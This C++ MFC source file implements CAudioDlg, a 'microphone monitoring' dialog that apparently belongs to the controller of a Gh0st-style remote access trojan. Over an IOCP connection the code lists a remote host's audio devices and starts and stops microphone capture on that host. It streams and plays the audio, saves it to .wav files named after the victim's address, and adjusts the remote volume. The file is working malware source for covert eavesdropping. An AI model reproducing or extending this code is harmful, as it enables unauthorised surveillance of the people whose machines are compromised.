#include "stdafx.h"
#include "Quick.h"
#include "AudioDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


//#define WOSA_POOR	8000
//#define WOSA_LOW	11025
//#define WOSA_NORMAL	22050
//#define WOSA_HIGH	44100

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg dialog

CAudioDlg::CAudioDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CAudioDlg::IDD, pParent)
	, m_bCheckRec(FALSE)
{

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_MIC));
	m_SelectedLines = 0;
	m_bOnClose = false;
	m_nTotalRecvBytes = 0;
	m_nTotalSendBytes = 0;
	m_SelectedDevice = m_SelectedDevice = 0;
	m_pWavePlayback = new CWavePlayback(&m_ACode);    //初始化播放
	m_pWavePlayback->StartPlay();					//启动播放线程
	m_pWaveRecord = new CWaveRecord(&m_ACode);		//初始化获取
	m_pWaveRecord->SetCommClient(pIOCPServer, pContext,this); //设置发送

}


void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAudioDlg)



	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_COMBO_INPUTLINES, m_combo_input_lines);
	DDX_Control(pDX, IDC_COMBO_INPUTDRIVE, m_combo_input_drive);
	DDX_Check(pDX, IDC_CHECK_REC, m_bCheckRec);
	DDX_Control(pDX, IDC_PROGRESS_RE, m_pro_re);
	DDX_Control(pDX, IDC_PROGRESS_S, m_pro_se);
	DDX_Control(pDX, IDC_SCROLLBAR_R_IN, m_Scrollbar_r_in);
	DDX_Control(pDX, IDC_SCROLLBAR_R_OUT, m_Scrollbar_r_out);
	DDX_Control(pDX, IDC_SCROLLBAR_L_IN, m_Scrollbar_l_in);
	DDX_Control(pDX, IDC_SCROLLBAR_L_OUT, m_Scrollbar_l_out);
}


BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	//{{AFX_MSG_MAP(CAudioDlg)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnSendDate)//下线
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BUTTON_RE, &CAudioDlg::OnBnClickedButtonRe)
	ON_BN_CLICKED(IDC_BUTTON_RE_STOP, &CAudioDlg::OnBnClickedButtonReStop)
	ON_BN_CLICKED(IDC_BUTTON_SE, &CAudioDlg::OnBnClickedButtonSe)
	ON_BN_CLICKED(IDC_BUTTON_SE_STOP, &CAudioDlg::OnBnClickedButtonSeStop)
	ON_BN_CLICKED(IDC_CHECK_REC, &CAudioDlg::OnBnClickedCheckRec)
	ON_CBN_SELCHANGE(IDC_COMBO_INPUTDRIVE, &CAudioDlg::OnSelchangeComboDriveIn)
	ON_CBN_SELCHANGE(IDC_COMBO_INPUTLINES, &CAudioDlg::OnSelchangeComboInputlines)
	ON_WM_HSCROLL()
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg message handlers



BOOL CAudioDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	str.Format(_T("麦克风监听 \\\\%s"), m_pContext->szAddress);
	SetWindowText(str);



//初始化远程设备列表
	WAVE_INFO Wave_Info;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&Wave_Info, lpBuffer, sizeof(WAVE_INFO));

	str.Format(_T("%s"), Wave_Info.str);

	CString strtemp;

	// '$'前为输入设备名  | 前为输入线路信息
	for (int i = 0; ; i++)
	{

		int nPos = str.Find('$');
		if (nPos == -1)
			break;

		strtemp = str.Mid(0, nPos);

		// 插入设备名
		m_combo_input_drive.InsertString(i, strtemp);
		// 截取剩余的字符串
		str = str.Right(str.GetLength() - nPos - 1);

		// 查找 输入线路信息
		nPos = str.Find('|');
		if (nPos == -1)
			continue;

		// 截取
		strtemp = str.Mid(0, nPos);
		str = str.Right(str.GetLength() - nPos - 1);

		// 添加到Combox
		ShowLinesCombox(strtemp, Wave_Info.nIndex);
	}

	m_combo_input_drive.SetCurSel(0);


	//控件初始化
	m_pro_re.SetRange(0, 1000);
	m_pro_se.SetRange(0, 1000);
	

	GetDlgItem(IDC_BUTTON_RE_STOP)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);

	GetDlgItem(IDC_SCROLLBAR_R_IN)->EnableWindow(FALSE);
	GetDlgItem(IDC_SCROLLBAR_R_OUT)->EnableWindow(FALSE);

	GetDlgItem(IDC_SCROLLBAR_R_IN)->EnableWindow(FALSE);
	GetDlgItem(IDC_SCROLLBAR_R_OUT)->EnableWindow(FALSE);

	GetDlgItem(IDC_SCROLLBAR_L_IN)->EnableWindow(FALSE);
	GetDlgItem(IDC_SCROLLBAR_L_OUT)->EnableWindow(FALSE);
	SCROLLINFO scrollinfo = { 0 };
	scrollinfo.cbSize = sizeof(SCROLLINFO);
	scrollinfo.fMask = SIF_RANGE | SIF_PAGE;
	scrollinfo.nMax = 50;
	scrollinfo.nMin = 0;
	scrollinfo.nPage = 3;
	m_Scrollbar_l_in.SetScrollInfo(&scrollinfo);
	m_Scrollbar_l_out.SetScrollInfo(&scrollinfo);
	m_Scrollbar_r_in.SetScrollInfo(&scrollinfo);
	m_Scrollbar_r_out.SetScrollInfo(&scrollinfo);

	m_Scrollbar_l_in.SetTheme(xtpControlThemeVisualStudio2012);
	m_Scrollbar_l_out.SetTheme(xtpControlThemeVisualStudio2012);
	m_Scrollbar_r_in.SetTheme(xtpControlThemeVisualStudio2012);
	m_Scrollbar_r_out.SetTheme(xtpControlThemeVisualStudio2012);
	

	return TRUE;  
				 
}

void CAudioDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("麦克风监听 \\\\ %s  [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024 ));
	SetWindowText(str);
}

void CAudioDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;

	CString	str;
	str.Format(_T(" %d KBytes"), m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, str);

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SEND_DATE:
	{	m_pro_re.StepIt();
	if (m_pro_re.GetPos() == 1000)
	{
		m_pro_re.SetPos(0);
	}
		m_pWavePlayback->Playback((char*)m_pContext->m_DeCompressionBuffer.GetBuffer(1),m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
	}
	break;
	case TOKEN_START_OK:
	{	
		GetDlgItem(IDC_BUTTON_RE)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_RE_STOP)->EnableWindow(TRUE);

		GetDlgItem(IDC_SCROLLBAR_R_IN)->EnableWindow(TRUE);
		GetDlgItem(IDC_SCROLLBAR_L_OUT)->EnableWindow(TRUE);
	}
	break;
	case TOKEN_STOP_OK:
	{
		GetDlgItem(IDC_BUTTON_RE)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON_RE_STOP)->EnableWindow(FALSE);

		GetDlgItem(IDC_SCROLLBAR_R_IN)->EnableWindow(FALSE);
		GetDlgItem(IDC_SCROLLBAR_L_OUT)->EnableWindow(FALSE);

	}
	break;
	case TOKEN_STOP_ERROR:
	{	
		//MessageBox(_T("客户命令执行失败"), _T("提示"));
	}
	break;

	//case TOKEN_AUDIO_CHANGE_FINISH:
	//{
	//	WAVE_INFO Wave_Info;
	//	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	//	memcpy(&Wave_Info, lpBuffer, sizeof(WAVE_INFO));
	//	ShowLinesCombox(Wave_Info.str, Wave_Info.nIndex);
	//}
	//break;
	default:
		//MessageBox(_T("错误命令"), _T("提示"));
		return;
	}
}

void CAudioDlg::OnCancel()
{
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	Sleep(1000);
	DestroyIcon(m_hIcon);
	m_pWavePlayback->StopPlay();
	m_pWavePlayback->closefile();
	delete	m_pWavePlayback;


	m_pWaveRecord->StopRec();
	delete	m_pWaveRecord;
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CAudioDlg::PostNcDestroy()
{
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}

void CAudioDlg::ShowLinesCombox(CString str, int nSelect)
{
	CString strtemp;
	// 清空ComBox
	m_combo_input_lines.ResetContent();
	for (int i = 0; ; i++)
	{
		// 输入线路由 @ 区分
		int nPos = str.Find('@');
		if (nPos == -1)
			break;

		strtemp = str.Mid(0, nPos);
		str = str.Right(str.GetLength() - nPos - 1);

		// 插入数据
		m_combo_input_lines.InsertString(i, strtemp);
	}
	m_SelectedLines = nSelect;
	m_combo_input_lines.SetCurSel(nSelect);
}

LRESULT CAudioDlg::OnSendDate(WPARAM wParam, LPARAM lParam)
{
	int* iEncodeSize = (int*)lParam;

	m_pro_se.StepIt();
	if (m_pro_se.GetPos() == 1000)
	{
		m_pro_se.SetPos(0);
	}
	m_nTotalSendBytes += *iEncodeSize;
	CString	str;
	str.Format(_T(" %d KBytes"), m_nTotalSendBytes / 1024);
	SetDlgItemText(IDC_TIPS_S, str);
	return 1;
}
void CAudioDlg::OnBnClickedButtonRe()
{
	BYTE bToken = COMMAND_SEND_START;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	GetDlgItem(IDC_BUTTON_RE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_RE_STOP)->EnableWindow(FALSE);
}


void CAudioDlg::OnBnClickedButtonReStop()
{
	csFileName = _T("");
	m_pWavePlayback->closefile();
	BYTE bToken = COMMAND_SEND_STOP;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	((CButton*)GetDlgItem(IDC_CHECK_REC))->SetCheck(FALSE);
	GetDlgItem(IDC_BUTTON_RE)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_RE_STOP)->EnableWindow(FALSE);
}


void CAudioDlg::OnBnClickedButtonSe()
{
	GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
	if (m_pWaveRecord->StartRec())
	{
		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);

		GetDlgItem(IDC_SCROLLBAR_R_OUT)->EnableWindow(TRUE);

		GetDlgItem(IDC_SCROLLBAR_L_IN)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("提示"));
	}
}


void CAudioDlg::OnBnClickedButtonSeStop()
{
	GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
	GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
	if (m_pWaveRecord->StopRec())
	{
		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(TRUE);

		GetDlgItem(IDC_SCROLLBAR_R_OUT)->EnableWindow(FALSE);
		GetDlgItem(IDC_SCROLLBAR_L_IN)->EnableWindow(FALSE);

	}
	else
	{
		GetDlgItem(IDC_BUTTON_SE_STOP)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_SE)->EnableWindow(FALSE);
		MessageBox(m_pWaveRecord->GetLastErrorString(), _T("提示"));
	}
}


void CAudioDlg::OnBnClickedCheckRec()
{
	UpdateData(TRUE);
	if (m_bCheckRec == FALSE)
	{
		csFileName = _T("");
		m_pWavePlayback->closefile();
		return;
	}

	csFileName =_T("");
	CString	strFileName = m_pContext->szAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.wav"));
	CFileDialog dlg(FALSE, _T("wav"), strFileName, OFN_OVERWRITEPROMPT, _T("Voice(*.wav)|*.wav|"), this);
	if (dlg.DoModal() != IDOK)
	{
		((CButton*)GetDlgItem(IDC_CHECK_REC))->SetCheck(FALSE);
		return;
	}
	csFileName = dlg.GetPathName();
	m_pWavePlayback->savetofile(csFileName);
}

void CAudioDlg::OnSelchangeComboDriveIn()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int nIndex = m_combo_input_drive.GetCurSel();
	if (nIndex == m_SelectedDevice)
		return;
	else
	{
		m_SelectedDevice = nIndex;

		WAVE_INFO Wave_Info;
		ZeroMemory(&Wave_Info, sizeof(WAVE_INFO));

		m_combo_input_drive.GetLBText(nIndex, Wave_Info.str);
		Wave_Info.nIndex = m_SelectedDevice;



		DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
		LPBYTE	lpBuffer = new BYTE[dwBytesLength];
		if (lpBuffer == NULL)
			return;

		lpBuffer[0] = COMMAND_AUDIO_CHANGER;

		memcpy(lpBuffer + 1, &Wave_Info, sizeof(WAVE_INFO));
		m_iocpServer->Send(m_pContext, lpBuffer, dwBytesLength);
		delete[] lpBuffer;

	}
}

void CAudioDlg::OnSelchangeComboInputlines()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	int nIndex = m_combo_input_lines.GetCurSel();
	if (nIndex == m_SelectedLines)
		return;
	else
	{
		m_SelectedLines = nIndex;


		WAVE_INFO Wave_Info;
		ZeroMemory(&Wave_Info, sizeof(WAVE_INFO));

		m_combo_input_drive.GetLBText(m_combo_input_drive.GetCurSel(), Wave_Info.str);
		Wave_Info.nIndex = m_SelectedLines;

		DWORD	dwBytesLength = 1 + sizeof(WAVE_INFO);
		LPBYTE	lpBuffer = new BYTE[dwBytesLength];
		if (lpBuffer == NULL)
			return;

		lpBuffer[0] = COMMAND_AUDIO_CHANGER_LINES;

		memcpy(lpBuffer + 1, &Wave_Info, sizeof(WAVE_INFO));
		m_iocpServer->Send(m_pContext, lpBuffer, dwBytesLength);
		delete[] lpBuffer;
	}
}

void CAudioDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	SCROLLINFO scrollinfo = { 0 };
	scrollinfo.cbSize = sizeof(SCROLLINFO);
	scrollinfo.fMask = SIF_ALL;
	pScrollBar->GetScrollInfo(&scrollinfo);
	int nNewPos = scrollinfo.nPos;

	switch (nSBCode)
	{
	case SB_THUMBTRACK: // 用户拖动滚动条
		nNewPos = nPos;
		break;
	case SB_LINELEFT:   // 左边的按钮
		nNewPos -= 1;
		break;
	case SB_LINERIGHT:  // 右边的按钮
		nNewPos += 1;
		break;
	case SB_PAGELEFT:   // 按页数向左边滚动
		nNewPos -= scrollinfo.nPage;
		break;
	case SB_PAGERIGHT:  // 按页数向右边滚动
		nNewPos += scrollinfo.nPage;
		break;
	default:
		break;
	}

	scrollinfo.nPos = nNewPos;
	pScrollBar->SetScrollInfo(&scrollinfo);

	if (nNewPos > scrollinfo.nMax)
	{
		nNewPos = scrollinfo.nMax;
	}
	if (nNewPos < scrollinfo.nMin)
	{
		nNewPos = scrollinfo.nMin;
	}

	
	TRACE(_T("%s       scrollinfo ：%d\n"), __FUNCTION__,nNewPos);

	if (pScrollBar== &m_Scrollbar_r_in)
	{
		LPBYTE	lpPacket = new BYTE[5];
		lpPacket[0] = COMMAND_SET_IN;
		memcpy(lpPacket+1, &nNewPos, 4);
		m_iocpServer->Send(m_pContext, lpPacket, 5);
		SAFE_DELETE_AR(lpPacket);

		str_CScrollBar.Format(_T("修改远程监听音量(%d)"), nNewPos);
		GetDlgItem(IDC_STATIC_R_IN)->SetWindowText(str_CScrollBar);
	}
	if (pScrollBar == &m_Scrollbar_r_out)
	{
		LPBYTE	lpPacket = new BYTE[5];
		lpPacket[0] = COMMAND_SET_OUT;
		memcpy(lpPacket+1, &nNewPos, 4);
		m_iocpServer->Send(m_pContext, lpPacket, 5);
		SAFE_DELETE_AR(lpPacket);
		str_CScrollBar.Format(_T("修改远程播放音量(%d)"), nNewPos);
		GetDlgItem(IDC_STATIC_R_OUT)->SetWindowText(str_CScrollBar);
	}
	if (pScrollBar == &m_Scrollbar_l_in)
	{
		m_pWaveRecord->SetVolume((float)nNewPos);
		str_CScrollBar.Format(_T("修改本地发送音量(%d)"), nNewPos);
		GetDlgItem(IDC_STATIC_L_IN)->SetWindowText(str_CScrollBar);
	}
	if (pScrollBar == &m_Scrollbar_l_out)
	{
		m_pWavePlayback->SetVolume((float)nNewPos);
		str_CScrollBar.Format(_T("修改本地播放音量(%d)"), nNewPos);
		GetDlgItem(IDC_STATIC_L_OUT)->SetWindowText(str_CScrollBar);
	}


	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}
